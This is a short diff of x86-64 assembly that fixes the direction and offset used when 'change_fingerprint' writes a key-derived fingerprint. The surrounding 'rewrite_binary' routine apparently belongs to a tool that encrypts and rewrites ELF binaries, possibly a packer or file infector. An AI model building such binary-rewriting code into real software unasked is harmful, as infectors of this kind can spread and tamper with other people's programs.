@@ -438,12 +438,12 @@ change_fingerprint:	;rdi:addr   rsi:key
 	enter 0, 0
 	mov rcx, 8
 	shr rsi, 32
-	inc rdi
+	dec rdi
 	while_rcx:
 		cmp rcx, 0
 		je while_rcx_end
 		dec rcx
-		dec rdi
+		inc rdi
 
 		mov rdx, rsi
 		shl rdx, 60
@@ -553,7 +553,6 @@ rewrite_binary:
 	add rsi, encryption_start - _start
 	mov rsi, QWORD[rsi]
 	add rdi, fingerprint - _start
-	add rdi, 7
 	call change_fingerprint
 
 	mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
